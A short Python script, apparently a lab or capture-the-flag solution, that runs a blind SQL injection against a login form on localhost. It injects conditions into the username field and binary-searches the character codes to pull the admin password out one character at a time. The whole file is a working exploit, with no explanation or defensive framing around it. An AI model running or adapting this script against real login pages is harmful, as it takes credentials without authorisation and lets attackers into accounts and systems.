import requests


url = 'http://localhost:5000/login'
password_length = 10


def check_condition(payload):
    data = {'username': payload, 'password': 'dummy'}
    response = requests.post(url, data=data)
    return "hello" in response.text.lower()


def extract_admin_password():
    password = ''
    for position in range(1, password_length + 1):
        low, high = 32, 127
        while low <= high:
            mid = (low + high) // 2
            payload = f"admin' AND UNICODE(SUBSTR(password, {position}, 1)) <= {mid} --"
            if check_condition(payload):
                high = mid - 1
            else:
                low = mid + 1
        password += chr(low)
        print(chr(low))
    return password


admin_password = extract_admin_password()
print(f"Admin password: {admin_password}")
